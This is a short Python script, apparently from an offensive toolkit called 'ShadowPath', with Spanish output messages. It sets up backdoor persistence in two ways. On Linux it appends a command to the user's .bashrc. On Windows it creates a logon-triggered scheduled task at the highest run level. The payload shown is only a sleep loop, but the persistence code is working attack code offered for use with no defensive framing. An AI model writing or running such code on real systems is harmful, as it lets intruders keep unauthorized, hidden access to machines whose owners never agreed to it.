import os
import platform
import subprocess
from pathlib import Path

def persist_linux(command):
    bashrc_path = Path.home() / ".bashrc"
    with open(bashrc_path, "a") as f:
        f.write(f"\n# ShadowPath persistence\n{command} &\n")
    print("[+] Persistencia añadida en .bashrc")

def persist_windows(command):
    task_name = "ShadowPathTask"
    cmd = [
        "schtasks", "/Create", "/SC", "ONLOGON",
        "/TN", task_name,
        "/TR", command,
        "/RL", "HIGHEST",
        "/F"
    ]
    subprocess.run(cmd, shell=True)
    print("[+] Tarea programada creada con schtasks")

def main():
    backdoor_cmd = "python -c \"import time; exec('while True: time.sleep(60)')\""

    system = platform.system().lower()
    if "linux" in system:
        persist_linux(backdoor_cmd)
    elif "windows" in system:
        persist_windows(backdoor_cmd)
    else:
        print("[-] Sistema no compatible.")

if __name__ == "__main__":
    main()
